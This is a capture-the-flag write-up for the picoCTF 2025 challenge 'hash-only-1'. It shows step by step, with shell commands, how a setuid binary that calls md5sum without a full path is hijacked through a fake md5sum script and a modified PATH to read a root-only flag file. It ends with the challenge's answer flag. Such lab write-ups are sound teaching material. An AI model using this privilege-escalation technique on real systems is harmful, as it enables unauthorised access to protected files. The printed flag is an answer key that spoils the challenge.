# hash-only-1

## Overview:
* Binary exploitation
* Medium
* picoCTF2025

## Description:
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

Additional details will be available after launching your challenge instance.

## Write-up:
Launch instance. Connect to it.

Check the directory using ls:
```bash
ctf-player@pico-chall$ ls
flaghasher
ctf-player@pico-chall$ 
```
Check the flaghasher binary using file:
```bash
ctf-player@pico-chall$ file flaghasher 
flaghasher: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c4fbd07a602b4570abdcfe273078247bdc96b5b2, for GNU/Linux 3.2.0, not stripped
ctf-player@pico-chall$ 
```
Now we know the architecture of the file. It's x86_64.

Use strings and grep flag to check what can we get:
```bash
ctf-player@pico-chall$ strings flaghasher | grep flag
Computing the MD5 hash of /root/flag.txt.... 
/bin/bash -c 'md5sum /root/flag.txt'
ctf-player@pico-chall$ 
```
Seems like it's using md5sum command to hash the /root/flag.txt

We can create our own md5sum file that'll cat the /root/flag.txt:

```bash
ctf-player@pico-chall$ cat > md5sum << 'EOF'
> #!/bin/bash
> echo "flag: "
> cat /root/flag.txt
> echo ""
> EOF
```
Double check:
```bash
ctf-player@pico-chall$ cat md5sum 
#!/bin/bash
echo "flag: "
cat /root/flag.txt
echo ""
ctf-player@pico-chall$
```
Yes it has been written.
Now we need to change mod for md5sum in order for flaghasher to execute it:
```bash
ctf-player@pico-chall$ chmod +x md5sum 
ctf-player@pico-chall$ 
```
We also need to set the PATH to ours:
```bash
ctf-player@pico-chall$ export PATH=$(pwd):$PATH
ctf-player@pico-chall$ echo $PATH
/home/ctf-player:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf-player@pico-chall$ 
```
Now we can run the binary and the the flag!
```bash
ctf-player@pico-chall$ ./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

flag: 
```

## Flag
```
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_c11be7b4}
```




